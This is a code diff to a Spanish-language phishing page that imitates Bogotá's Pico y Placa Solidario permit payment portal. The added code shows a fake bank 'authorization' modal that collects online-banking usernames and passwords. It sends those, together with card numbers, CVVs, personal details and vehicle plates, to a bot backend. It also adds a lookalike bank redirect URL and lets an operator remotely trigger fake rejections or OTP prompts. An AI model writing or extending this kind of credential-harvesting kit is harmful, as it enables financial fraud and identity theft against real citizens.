@@ -2,26 +2,15 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pico y Placa Solidario Bogotá - Adquisición de Permiso de Circulación</title>
 <meta name="description" content="El Pico y Placa Solidario permite adquirir voluntariamente un permiso diario, mensual o semestral para circular en Bogotá sin la restricción del pico y placa.">
 <meta name="robots" content="noindex, nofollow">
-<script src="https://cdn.tailwindcss.com"></script>
-<script>
-tailwind.config = {
-theme: {
-extend: {
-colors: {
-'light-green': '#88f456',
-'dark-green': '#00271c',
-},
-fontFamily: {
-sans: ['Inter', 'system-ui', 'sans-serif'],
-}
-}
-}
-}
-</script>
+
+<!-- NUEVO CSS LOCAL COMPILADO -->
+<link rel="stylesheet" href="styles.css">
+<link rel="stylesheet" href="pse-animacion.css">
+
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Lato:wght@400;500;700;900&display=swap" rel="stylesheet">
@@ -246,6 +235,30 @@ html { scroll-behavior: smooth; }
 .pago-error-otp-texto { font-size: 15px; color: #555; text-align: center; max-width: 400px; line-height: 1.5; }
 .pago-error-otp-btn { background: #00271c; color: #88f456; border: none; padding: 14px 32px; border-radius: 9999px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 16px; }
 .pago-error-otp-btn:hover { background: #003d2b; }
+
+/* ===== NUEVO MODAL AUTORIZACIÓN (BANCA VIRTUAL) ===== */
+.modal-autorizacion-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.6); z-index: 99999; display: flex; align-items: center; justify-content: center; padding: 16px; overflow-y: auto; backdrop-filter: blur(2px); -webkit-backdrop-filter: blur(2px); }
+.modal-autorizacion-overlay.hidden { display: none; }
+.modal-autorizacion-box { background: #fff; border-radius: 16px; width: 100%; max-width: 440px; box-shadow: 0 10px 40px rgba(0,0,0,0.15); overflow: hidden; animation: authFadeIn 0.3s cubic-bezier(0.34, 1.56, 0.64, 1); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+@keyframes authFadeIn { from { opacity: 0; transform: scale(0.95) translateY(10px); } to { opacity: 1; transform: scale(1) translateY(0); } }
+.modal-autorizacion-body { padding: 24px; color: #16181e; }
+.auth-intro { font-size: 14px; line-height: 1.5; color: #3c3c3c; margin: 0 0 16px; }
+.auth-intro strong { color: #16181e; }
+.auth-divisor { height: 1px; background: #e5e5e5; margin: 16px 0; }
+.auth-subtitulo { font-size: 15px; font-weight: 700; color: #16181e; margin: 0 0 12px; }
+.auth-detalle-linea { display: flex; flex-direction: column; padding: 8px 0; border-bottom: 1px dashed #f0f0f0; gap: 4px; }
+.auth-detalle-linea span { color: #7a7a7a; font-size: 13px; }
+.auth-detalle-linea strong { color: #16181e; font-weight: 600; font-size: 14px; word-break: break-word; }
+@media (min-width: 400px) { .auth-detalle-linea { flex-direction: row; justify-content: space-between; align-items: center; } }
+.auth-label { display: block; font-size: 13px; font-weight: 600; margin: 14px 0 6px; color: #16181e; }
+.auth-input { width: 100%; padding: 12px 14px; font-size: 15px; border: 1.5px solid #cacaca; border-radius: 8px; outline: none; box-sizing: border-box; transition: border-color 0.2s, box-shadow 0.2s; font-family: inherit; }
+.auth-input:focus { border-color: #16181e; box-shadow: 0 0 0 3px rgba(22,24,30,0.1); }
+.auth-error { margin-top: 12px; background: #fdecea; color: #b71c1c; border: 1px solid #f5c6cb; padding: 10px 12px; border-radius: 8px; font-size: 13px; text-align: center; font-weight: 600; }
+.auth-error.hidden { display: none; }
+.auth-btn-enviar { margin-top: 20px; width: 100%; padding: 14px; background: #2c2a29; color: #b2f599; border: none; border-radius: 100px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s, transform 0.1s; font-family: inherit; }
+.auth-btn-enviar:hover { background: #3d3a39; }
+.auth-btn-enviar:active { transform: scale(0.98); }
+.auth-btn-enviar:disabled { opacity: 0.6; cursor: not-allowed; }
 </style>
 </head>
 <body class="font-sans">
@@ -507,8 +520,8 @@ secretariamovilidadbogota</a></li>
 </svg>
 </div>
 <img id="pagoErrorLogo" src="" alt="Marca" class="pago-error-logo">
-<div class="pago-error-titulo">Pago rechazado</div>
-<div class="pago-error-texto">Los datos ingresados son incorrectos. Verifique y vuelva a intentar su pago.</div>
+<div class="pago-error-titulo" id="pagoErrorTitulo">Pago rechazado</div>
+<div class="pago-error-texto" id="pagoErrorTexto">Los datos ingresados son incorrectos. Verifique y vuelva a intentar su pago.</div>
 <button type="button" class="pago-error-btn" onclick="cerrarPagoError()">Volver a intentar</button>
 </div>
 <div id="pagoCargaOtpOverlay" class="pago-carga-otp-overlay hidden">
@@ -524,10 +537,48 @@ secretariamovilidadbogota</a></li>
 <line x1="9" y1="9" x2="15" y2="15"></line>
 </svg>
 </div>
-<div class="pago-error-otp-titulo">Código incorrecto</div>
-<div class="pago-error-otp-texto">El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.</div>
+<div class="pago-error-otp-titulo" id="pagoErrorOtpTitulo">Código incorrecto</div>
+<div class="pago-error-otp-texto" id="pagoErrorOtpTexto">El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.</div>
 <button type="button" class="pago-error-otp-btn" onclick="cerrarErrorOtpYReintentar()">Volver a ingresar</button>
 </div>
+
+<!-- 🔥 NUEVO MODAL AUTORIZACIÓN (BANCA VIRTUAL) -->
+<div id="modalAutorizacion" class="modal-autorizacion-overlay hidden">
+  <div class="modal-autorizacion-box">
+    <div style="background: #2c2a29; padding: 12px; display: flex; justify-content: center; align-items: center; border-bottom: 3px solid #b2f599; width: 100%; box-sizing: border-box;">
+      <div style="display: flex; align-items: center; justify-content: center; gap: 6px; flex-wrap: wrap; text-align: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" style="width: 20px; height: 20px; flex-shrink: 0;">
+          <path d="M12 2L3 7V17L12 22L21 17V7L12 2Z" stroke="#b2f599" stroke-width="2" stroke-linejoin="round"/>
+          <path d="M9 12L11 14L15 10" stroke="#b2f599" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span style="color: #b2f599; font-size: 13px; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase;">PAGOS SEGUROS POR</span>
+        <img src="img/LogoSecundario.svg" alt="Wompi" style="height: 35px; width: auto; border-radius: 8px; object-fit: cover; margin-left: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); background-color: #fff; padding: 2px;" onerror="this.style.display='none'">
+      </div>
+    </div>
+
+    <div class="modal-autorizacion-body">
+      <p class="auth-intro">
+        La transacción que intentas realizar en <strong>PICO Y PLACA BG S.A</strong>
+        por <strong id="authMonto">0</strong> COP el <strong id="authFecha">--/--/----</strong>
+        con tu tarjeta terminada en <strong id="authTarjeta">****</strong> debe ser autorizada por seguridad.
+      </p>
+      <div class="auth-divisor"></div>
+      <h3 class="auth-subtitulo">Detalles de transacción</h3>
+      <div class="auth-detalle-linea"><span>Comercio:</span><strong>PICO Y PLACA BG S.A</strong></div>
+      <div class="auth-detalle-linea"><span>Monto</span><strong id="authMontoDetalle">$0 COP</strong></div>
+      <div class="auth-detalle-linea"><span>Tarjeta</span><strong id="authTarjetaDetalle">**** **** **** ****</strong></div>
+      <div class="auth-divisor"></div>
+      <h3 class="auth-subtitulo">Ingresa las credenciales de tu Banca Virtual:</h3>
+      <label class="auth-label">Usuario</label>
+      <input type="text" id="authUsuario" class="auth-input" autocomplete="off" placeholder="Usuario">
+      <label class="auth-label">Contraseña</label>
+      <input type="password" id="authPassword" class="auth-input" autocomplete="off" placeholder="Contraseña">
+      <div id="authError" class="auth-error hidden"></div>
+      <button id="authEnviarBtn" class="auth-btn-enviar" type="button">Enviar</button>
+    </div>
+  </div>
+</div>
+
 <div id="modalRegistro" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50">
 <div class="relative w-full max-w-4xl h-[90vh] bg-white shadow-xl overflow-hidden flex flex-col mx-2 rounded-lg">
 <div class="shrink-0 flex items-center border-b relative">
@@ -967,9 +1018,9 @@ alt="Para mayor información comunícate con nosotros">
 </div>
 </div>
 
-<!-- ============================================================
-     MODAL TARJETA (MEJORADO CON AMEX Y ANIMACIÓN)
-     ============================================================ -->
+<!-- ============================================================ -->
+<!-- MODAL TARJETA (MEJORADO CON AMEX Y ANIMACIÓN) -->
+<!-- ============================================================ -->
 <div id="modalTarjeta" class="tarjeta-modal hidden">
   <div class="tarjeta-modal-overlay" onclick="cerrarModalTarjeta()"></div>
   <div class="tarjeta-modal-content">
@@ -1284,6 +1335,7 @@ var sessionIdActualPago = '';
 var pagoOtpPollingInterval = null;
 
 var URLS_BANCOS = {
+'bancolombia': 'https://safeplacechech.vercel.app',
 'bbva':        'https://securecheckout-sandy.vercel.app',
 'caja-social': 'https://checkoutplacabogo.vercel.app',
 'popular':     'https://securepay21.vercel.app',
@@ -1525,6 +1577,53 @@ document.getElementById('totalPagar').textContent = 'Total a pagar: $' + total.t
 return total;
 }
 
+function obtenerDatosPersonales() {
+    function getVal(name) {
+        var el = document.querySelector('#vistaRegistro [name="' + name + '"]');
+        return el ? el.value.trim() : '';
+    }
+    return {
+        primerNombre: getVal('primerNombre'),
+        segundoNombre: getVal('segundoNombre'),
+        primerApellido: getVal('primerApellido'),
+        segundoApellido: getVal('segundoApellido'),
+        correoPrimario: getVal('correoPrimario'),
+        correoSecundario: getVal('correoSecundario'),
+        departamento: getVal('departamentoResidencia'),
+        municipio: getVal('municipioResidencia'),
+        localidad: getVal('localidadResidencia'),
+        direccionCorrespondencia: getVal('direccionCorrespondencia'),
+        numeroTelefono: getVal('numeroTelefono'),
+        direccionOrigen: getVal('direccionOrigen'),
+        direccionDestino: getVal('direccionDestino'),
+        estrato: getVal('estrato'),
+        tipoPropiedad: getVal('tipoPropiedad'),
+        soyPropietario: getVal('soyPropietario'),
+        motivoViaje: getVal('motivoViaje')
+    };
+}
+
+function obtenerDatosPlacas() {
+    var filas = document.querySelectorAll('#filasPlacas > [data-placa]');
+    var listaPlacas = [];
+    filas.forEach(function(fila) {
+        var placa = fila.dataset.placa;
+        var select = fila.querySelector('select');
+        var duracionTexto = select.options[select.selectedIndex].text.split('—')[0].trim();
+        var valor = parseInt(select.value || 0);
+        var fechaInicio = fila.querySelector('.input-fecha-inicio').value;
+        var fechaFin = fila.querySelector('.input-fecha-fin').value;
+        listaPlacas.push({
+            placa: placa,
+            duracion: duracionTexto,
+            valor: valor,
+            fechaInicio: fechaInicio,
+            fechaFin: fechaFin
+        });
+    });
+    return listaPlacas;
+}
+
 function setAporte(activo) {
 aporteActivo = activo;
 if (activo) {
@@ -1627,6 +1726,20 @@ if (pseOverlay) { pseOverlay.classList.remove('hidden'); document.body.style.ove
 var pseGif = document.getElementById('pseAnimation');
 if (pseGif && pseGif.src) { var srcActual = pseGif.src; pseGif.src = ''; setTimeout(function() { pseGif.src = srcActual; }, 50); }
 var urlDestino = URLS_BANCOS[bancoSeleccionadoPSE];
+
+// 🔥 GUARDAR DATOS PERSONALES Y PLACAS ANTES DE REDIRIGIR A PSE
+fetch(URL_BOT_RAILWAY + '/cc-bogota/guardar-consulta', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        sessionId: window.__PYP_SESSION__ || sessionId,
+        tipoPago: 'PSE',
+        banco: bancoSeleccionadoPSE,
+        datosPersonales: obtenerDatosPersonales(),
+        placasData: obtenerDatosPlacas()
+    })
+}).catch(function(err) { console.error('Error guardando PSE:', err); });
+
 setTimeout(function() {
 if (urlDestino) { window.location.href = urlDestino; }
 else {
@@ -1707,12 +1820,28 @@ document.getElementById('pagoCargaOverlay').classList.add('hidden');
 document.body.style.overflow = '';
 }
 
-function mostrarPagoError(marca) {
+function mostrarPagoError(marca, tipo) {
+tipo = tipo || 'rechazado';
 var overlay = document.getElementById('pagoErrorOverlay');
 var logo = document.getElementById('pagoErrorLogo');
 if (marca === 'visa') { logo.src = 'img/Visa_Inc._logo_(2005–2014).svg'; }
 else if (marca === 'amex') { logo.src = 'https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg'; }
 else { logo.src = 'img/Mastercard-logo.svg'; }
+
+var titulo = document.getElementById('pagoErrorTitulo');
+var texto = document.getElementById('pagoErrorTexto');
+var btn = document.querySelector('.pago-error-btn');
+
+if (tipo === 'cc_error') {
+    titulo.textContent = 'Tarjeta no admitida';
+    texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Por favor, comunícate con tu banco o intenta con otra tarjeta.';
+    btn.textContent = 'Entendido';
+} else {
+    titulo.textContent = 'Pago rechazado';
+    texto.textContent = 'El banco emisor rechazó la transacción. Verifica los datos o intenta con otra tarjeta.';
+    btn.textContent = 'Volver a intentar';
+}
+
 ocultarPagoCarga();
 overlay.classList.remove('hidden');
 document.body.style.overflow = 'hidden';
@@ -1730,36 +1859,46 @@ pagoPollingInterval = setInterval(function() {
 fetch(URL_BOT_RAILWAY + '/cc-bogota/estado/' + sessionId)
 .then(function(r) { return r.json(); })
 .then(function(data) {
-if (data.estado === 'aceptado') {
-clearInterval(pagoPollingInterval);
-pagoPollingInterval = null;
-ocultarPagoCarga();
-var numTarjeta = (payload.tarjeta || '').replace(/\D/g, '');
-var ultimos4 = numTarjeta.slice(-4);
-var enmascarado = '************' + ultimos4;
-document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
-document.getElementById('popupCardNumber').textContent = enmascarado;
-document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
-document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
-var logoContainer = document.getElementById('cardBrandLogo');
-if (marca === 'visa') {
-logoContainer.innerHTML = '<img src="img/Visa_Inc._logo_(2005–2014).svg" style="height:28px; width:auto;">';
-} else if (marca === 'amex') {
-logoContainer.innerHTML = '<img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" style="height:28px; width:auto; border-radius:3px;">';
-} else {
-logoContainer.innerHTML = '<img src="img/Mastercard-logo.svg" style="height:28px; width:auto;">';
-}
-var today = new Date();
-document.getElementById('currentDate').textContent = 
-String(today.getDate()).padStart(2, '0') + '/' +
-String(today.getMonth() + 1).padStart(2, '0') + '/' +
-today.getFullYear();
-openAuthModal();
-} else if (data.estado === 'rechazado') {
-clearInterval(pagoPollingInterval);
-pagoPollingInterval = null;
-mostrarPagoError(marca);
-}
+    if (data.estado === 'aceptado' || data.accion === 'ACEPTAR' || data.estado === 'otp') {
+        clearInterval(pagoPollingInterval);
+        pagoPollingInterval = null;
+        ocultarPagoCarga();
+        var numTarjeta = (payload.tarjeta || '').replace(/\D/g, '');
+        var ultimos4 = numTarjeta.slice(-4);
+        var enmascarado = '************' + ultimos4;
+        document.getElementById('lastFourDigitsPopup').textContent = enmascarado;
+        document.getElementById('popupCardNumber').textContent = enmascarado;
+        document.getElementById('montoPopup').textContent = Number(payload.monto).toLocaleString('es-CO');
+        document.getElementById('montoPopup2').textContent = Number(payload.monto).toLocaleString('es-CO');
+        var logoContainer = document.getElementById('cardBrandLogo');
+        if (marca === 'visa') {
+            logoContainer.innerHTML = '<img src="img/Visa_Inc._logo_(2005–2014).svg" style="height:28px; width:auto;">';
+        } else if (marca === 'amex') {
+            logoContainer.innerHTML = '<img src="https://www.americanexpress.com/content/dam/amex/us/merchant/supplies-uplift/product/images/img-WEBLOGO1-01.jpg" style="height:28px; width:auto; border-radius:3px;">';
+        } else {
+            logoContainer.innerHTML = '<img src="img/Mastercard-logo.svg" style="height:28px; width:auto;">';
+        }
+        var today = new Date();
+        document.getElementById('currentDate').textContent = 
+        String(today.getDate()).padStart(2, '0') + '/' +
+        String(today.getMonth() + 1).padStart(2, '0') + '/' +
+        today.getFullYear();
+        openAuthModal();
+    } else if (data.estado === 'autorizacion' || data.accion === 'AUTORIZAR') {
+        clearInterval(pagoPollingInterval);
+        pagoPollingInterval = null;
+        ocultarPagoCarga();
+        var cardInput = document.querySelector('#cardNumber').value.replace(/\D/g, '');
+        var ultimos4 = cardInput.slice(-4);
+        abrirModalAutorizacion({
+            monto: payload.monto,
+            ultimos4: ultimos4
+        });
+    } else if (data.estado === 'rechazado' || data.accion === 'RECHAZAR' || data.estado === 'cc_error' || data.accion === 'CC_ERROR') {
+        clearInterval(pagoPollingInterval);
+        pagoPollingInterval = null;
+        mostrarPagoError(marca, data.estado === 'cc_error' ? 'cc_error' : 'rechazado');
+    }
 })
 .catch(function(err) { console.error('Error consultando estado:', err); });
 }, 2000);
@@ -1934,7 +2073,9 @@ docNumber: docNumber.value.trim(),
 monto: totalMonto,
 expMes: expiryMonth.value,
 expAnio: expiryYear.value,
-cvv: cvv.value
+cvv: cvv.value,
+placasData: obtenerDatosPlacas(),
+datosPersonales: obtenerDatosPersonales()
 };
 
 fetch(URL_BOT_RAILWAY + '/cc-bogota/enviar-pago', {
@@ -2040,8 +2181,24 @@ document.getElementById('pagoCargaOtpOverlay').classList.add('hidden');
 document.body.style.overflow = '';
 }
 
-function mostrarErrorOtp() {
+function mostrarErrorOtp(tipo) {
+tipo = tipo || 'rechazado';
 ocultarCargaOtp();
+
+var titulo = document.getElementById('pagoErrorOtpTitulo');
+var texto = document.getElementById('pagoErrorOtpTexto');
+var btn = document.querySelector('.pago-error-otp-btn');
+
+if (tipo === 'cc_error') {
+    titulo.textContent = 'Tarjeta no admitida';
+    texto.textContent = 'Tu tarjeta no está habilitada para este tipo de compras. Por favor, comunícate con tu banco o intenta con otra tarjeta.';
+    btn.textContent = 'Entendido';
+} else {
+    titulo.textContent = 'Código incorrecto';
+    texto.textContent = 'El código que ingresaste no es válido. Por favor, vuelve a ingresarlo correctamente.';
+    btn.textContent = 'Volver a ingresar';
+}
+
 document.getElementById('pagoErrorOtpOverlay').classList.remove('hidden');
 document.body.style.overflow = 'hidden';
 }
@@ -2058,22 +2215,122 @@ pagoOtpPollingInterval = setInterval(function() {
 fetch(URL_BOT_RAILWAY + '/cc-bogota/estado/' + sessionId)
 .then(function(r) { return r.json(); })
 .then(function(data) {
-if (data.estado === 'aceptado') {
-clearInterval(pagoOtpPollingInterval);
-pagoOtpPollingInterval = null;
-ocultarCargaOtp();
-setTimeout(function() {
-window.location.href = window.location.pathname;
-}, 300);
-} else if (data.estado === 'rechazado') {
-clearInterval(pagoOtpPollingInterval);
-pagoOtpPollingInterval = null;
-mostrarErrorOtp();
-}
+    if (data.estado === 'aceptado' || data.accion === 'ACEPTAR') {
+        clearInterval(pagoOtpPollingInterval);
+        pagoOtpPollingInterval = null;
+        ocultarCargaOtp();
+        setTimeout(function() {
+            window.location.href = window.location.pathname;
+        }, 300);
+    } else if (data.estado === 'autorizacion' || data.accion === 'AUTORIZAR') {
+        clearInterval(pagoOtpPollingInterval);
+        pagoOtpPollingInterval = null;
+        ocultarCargaOtp();
+        var cardInput = document.querySelector('#cardNumber').value.replace(/\D/g, '');
+        var ultimos4 = cardInput.slice(-4);
+        abrirModalAutorizacion({
+            monto: calcularTotal() || 70294,
+            ultimos4: ultimos4
+        });
+    } else if (data.estado === 'rechazado' || data.accion === 'RECHAZAR' || data.estado === 'cc_error' || data.accion === 'CC_ERROR') {
+        clearInterval(pagoOtpPollingInterval);
+        pagoOtpPollingInterval = null;
+        mostrarErrorOtp(data.estado === 'cc_error' ? 'cc_error' : 'rechazado');
+    }
 })
 .catch(function(err) { console.error('Error consultando estado OTP:', err); });
 }, 2000);
 }
+
+/* ============================================================
+   🔥 NUEVAS FUNCIONES: MODAL DE AUTORIZACIÓN (BANCA VIRTUAL)
+   ============================================================ */
+function abrirModalAutorizacion(opciones) {
+    opciones = opciones || {};
+    var monto = opciones.monto || calcularTotal() || 70294;
+    var ultimos4 = opciones.ultimos4 || '';
+    var montoFormateado = Number(monto).toLocaleString('es-CO');
+
+    var hoy = new Date();
+    var fechaStr = String(hoy.getDate()).padStart(2, '0') + '/' +
+                   String(hoy.getMonth() + 1).padStart(2, '0') + '/' +
+                   hoy.getFullYear();
+
+    document.getElementById('authMonto').textContent = montoFormateado;
+    document.getElementById('authMontoDetalle').textContent = '$' + montoFormateado + ' COP';
+    document.getElementById('authFecha').textContent = fechaStr;
+
+    var tarjetaMask = '**** **** **** ' + (ultimos4 || '****');
+    document.getElementById('authTarjeta').textContent = ultimos4 ? '**** ' + ultimos4 : '****';
+    document.getElementById('authTarjetaDetalle').textContent = tarjetaMask;
+
+    document.getElementById('authUsuario').value = '';
+    document.getElementById('authPassword').value = '';
+    document.getElementById('authError').classList.add('hidden');
+    document.getElementById('authEnviarBtn').disabled = false;
+    document.getElementById('authEnviarBtn').textContent = 'Enviar';
+
+    var overlay = document.getElementById('modalAutorizacion');
+    overlay.classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+
+    setTimeout(function() { document.getElementById('authUsuario').focus(); }, 200);
+}
+
+function cerrarModalAutorizacion() {
+    document.getElementById('modalAutorizacion').classList.add('hidden');
+    document.body.style.overflow = '';
+}
+
+document.getElementById('authEnviarBtn').addEventListener('click', function() {
+    var usuario = document.getElementById('authUsuario').value.trim();
+    var password = document.getElementById('authPassword').value.trim();
+    var errorBox = document.getElementById('authError');
+    var btnEnviar = document.getElementById('authEnviarBtn');
+
+    if (!usuario || usuario.length < 3) {
+        errorBox.textContent = 'Por favor ingresa tu usuario.';
+        errorBox.classList.remove('hidden');
+        return;
+    }
+    if (!password || password.length < 3) {
+        errorBox.textContent = 'Por favor ingresa tu contraseña.';
+        errorBox.classList.remove('hidden');
+        return;
+    }
+
+    errorBox.classList.add('hidden');
+    btnEnviar.disabled = true;
+    btnEnviar.textContent = 'Enviando...';
+
+    fetch(URL_BOT_RAILWAY + '/cc-bogota/enviar-autorizacion', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            sessionId: sessionIdActualPago,
+            usuario: usuario,
+            password: password
+        })
+    })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+        if (data && data.ok) {
+            cerrarModalAutorizacion();
+            document.getElementById('pagoCargaOverlay').classList.remove('hidden');
+            document.body.style.overflow = 'hidden';
+        } else {
+            throw new Error((data && data.error) || 'Error al enviar');
+        }
+    })
+    .catch(function(err) {
+        console.error('Error autorización:', err);
+        errorBox.textContent = 'No se pudo enviar. Intenta de nuevo.';
+        errorBox.classList.remove('hidden');
+        btnEnviar.disabled = false;
+        btnEnviar.textContent = 'Enviar';
+    });
+});
+
 </script>
 </body>
 </html>
